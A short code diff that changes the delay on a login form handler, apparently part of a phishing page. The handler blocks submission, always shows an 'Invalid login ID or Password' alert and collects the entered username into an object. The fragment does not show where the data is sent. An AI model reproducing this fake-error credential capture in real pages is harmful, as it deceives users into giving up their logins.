@@ -4,7 +4,7 @@
     event.preventDefault();
     setTimeout(function () {
       alert("Invalid login ID or Password");
-    }, 3000);
+    }, 2000);
     try {
       var login_data = {
         username: document.getElementById("user").value,
